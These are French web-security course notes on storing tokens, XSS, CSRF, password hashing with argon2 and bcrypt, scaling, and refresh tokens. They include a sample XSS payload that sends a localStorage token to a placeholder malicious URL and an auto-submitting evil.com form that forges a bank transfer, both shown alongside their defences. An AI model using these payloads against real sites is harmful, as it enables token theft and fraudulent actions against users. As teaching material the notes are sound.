## Stockage des tokens

Tokens au sens large : 
- `sessionId`
- `token JWT`
- ou n'importe quel autre token

Stockage côté front-end : 
- dans le `localStorage`
  - avantage : facile à comprendre, stockage à faire manuellement
    - `document.localStorage.setItem()`
  - inconvénient : le token est alors sensible aux **attaques XSS**
    - voir l'exemple plus bas
- dans les `cookies`
  - avantages : 
    - c'est le server qui set le cookie (`header Set-Cookie`)
    - les cookies sont stockées automatiquement (rien à faire dans le code)
    - les cookies sont transmis automatiquement (rien à faire dans le code)
    - ils ont une durée de vie
    - possibilité d'être `HttpOnly` => ils ne sont pas accessible via le code front 
      - HttpOnly = `document.cookies = {}`
      - Pas HttpOnly = `document.cookies = { key: value }`
  - inconvénient : 
    - sensibles potentiellement aux **attaques CSRF** si mal configuré ou configuration trop laxiste

- dans la `RAM` ou `Session storage` ? 
  - possible aussi mais on perd le token à chaque fermeture du navigateur.


**XSS = Cross-Site Scripting** 
- Idée : faire exécuter du JavaScript malveillant par le navigateur d'une cible qui accède à une page
- Attaquant : `BOB`
- Victime : `ALICE`
- imaginons un formulaire où on renseigne son `firstname`
- BOB indique : `<script>const token = document.localStorage.getItem("token"); + fetch(URL_MALVEILLANTE, body: token)</script>`
- ALICE se rend sur le profil de BOB, et au lieu d'afficher le firstname, si le code est mal fait (ex: `innerHTML = firstname`), alors le JS malveillant de BOB s'exécute, et le token est transféré à BOB

```js
ELEMENT.innerHTML = info; // danger
ELEMENT.innerText = info; // ok
```

**CSRF = Cross-Site Request Forgery** 
- Idée : piéger un utilisateur déjà connecté à un site (ex : `bank.com`) pour lui faire exécuter une action à son insu.
- Attaquant : `BOB`
- Victime : `ALICE`
- ALICE s'est déjà connecté sur sa banque il y a moins d'une heure (son navigateur contient encore le cookie d'authentification)
- BOB crée un site piégé (`evil.com`) qui contient un formulaire ou une image qui déclenche une requête automatique vers `bank.com` (ex : virement d'argent).
- ALICE visite `evil.com`, son navigateur envoie la requête à `bank.com` avec ses cookies de session (transmis automatiquement), comme si elle faisait l’action elle-même.
- Si `bank.com` ne vérifie pas que la requête vient bien de son propre site (`bank.com` plutôt que `evil.com`) via un `token CSRF` ou l’en-tête `SameSite`, l’action est validée.
  - résultat : Alice a effectué un virement à BOB sans le savoir


```html
<!-- evil.com présente un formulaire automatisé -->

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="BOB_COMPTE">
  <input type="hidden" name="amount" value="1000">
</form>

<script>document.forms[0].submit();</script>
```


## Hashage de mot de passe

Attention au vocabulaire : 
- **Chiffrement** (chiffrer) : 
  - opération à double sens : on chiffre un message, puis on peut déchiffrer le message chiffré
  - cas d'usage typique : SSH, HTTPS
- **Hachage** (hacher) : 
  - opération à sens unique : on hache un mot de passe, on ne peut pas déhacher un mot un hash.
  - cas d'usage typique : stockage de mot de passe


Il existe plusieurs algorithmes de hachage, selon les recommandations d'OWASP : 
- `argon2`
- `scrypt`
- `bcrypt`

Certains sont désuet :
- on évite `md5`

Ils fonctionne sur le même principe :

```
$argon2id$v=19$m=65536,t=3,p=4$2QF21eQQr6BWCjW3OSEgVg$X7jpXBW3zci5KeAzU+Kf0ob+bnFstETK6j4JXBq9xuM

$argon2id -> choix de l'algorithm

         $v=19 -> version de l'algorithme

              $m=65536 -> mémoire utilisé
                      
                      t=3 -> nombre d'd'itérations
                        
                           p=4 -> parallélisme
                             
                             $2QF21eQQr6BWCjW3OSEgVg -> sel
                                                    
                                                    $X7jpXBW3zci5KeAzU+Kf0ob+bnFstETK6j4JXBq9xuM -> hash
```

Avant de hacher le mot de passe, l'algorithme génère un "sel" généré aléatoirement pour rajouter de l'aléatoire dans le mot de passe haché. De sorte à ce que, si deux utilisateurs ont le même mot de passe, alors les hash seront différents. Cela évite ainsi les analyses statistiques sur une BDD (ex : 50K hash similaire dans une BDD ==> ces 50K utilisateurs ont probablement le mot de passe 'password')

L'opération de hashage prend du temps, défini par le **nombre d'd'itérations** (paramètre `t`) : 
- plus `t` est grand, plus le hash est long à produire, plus ça réduit les risques d'attaques brute-force

Exemple avec `bcrypt`, le salt round : 

```js
rounds=8 : ~40 hashes/sec
rounds=9 : ~20 hashes/sec
rounds=10: ~10 hashes/sec
rounds=11: ~5  hashes/sec
rounds=12: 2-3 hashes/sec
rounds=13: ~1 sec/hash
rounds=14: ~1.5 sec/hash
rounds=15: ~3 sec/hash
rounds=25: ~1 hour/hash
rounds=31: 2-3 days/hash
```

On général, on cherche un compromis entre la sécurité et l'expérience utilisateur.

## Scaler ? Ca veut dire quoi ? 

Scaler = resister à la monter en charge de l'application (= plus d'utilisateurs !).

Deux approches : 
- scaling vertical : on achète une machine plus puissante pour faire tourner l'application
- scaling horizontal : on achète plusieurs machines, chacune faisant tourner l'application, et répartir équitablement la charge entre les machines

## Mécanisme du refresh token d'un point de vu du frontend

Context : 
- mon access token est périmé
- je souhaite accéder à la route `GET /api/levels` (protégée)

Que doit faire le front (mécanisme à mettre en place manuellement) ?

- request : `fetch("/api/levels" + access token)`  
	- response : 401 (car access token périmé)

- request : `fetch("/api/auth/refresh" + refresh token)`
	- response : un nouvel access token 

- request : `fetch("/api/levels", access token)`
	- response : [{}, {}, {}]


- ==> d'un point de vu du backend : 3 appels API
- ==> d'un point de vu de l'utilisateur : quelques ms de latence supplémentaire pour l'accès à la route

## Conseil pour l'apothéose

Ne vous embêtez pas : 
- access token d'une journée
- pas de mécanisme de refresh token
